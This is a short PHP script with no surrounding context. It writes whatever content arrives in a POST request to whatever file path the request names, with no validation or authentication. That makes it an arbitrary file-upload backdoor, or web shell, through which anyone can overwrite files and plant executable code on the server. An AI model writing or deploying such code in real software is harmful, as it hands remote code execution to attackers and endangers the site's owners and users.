<?php
$fn = $_POST['file'];
$content = $_POST['content'];
$fh = fopen($fn, "w");
fwrite($fh, $content);
fclose($fh);
?>
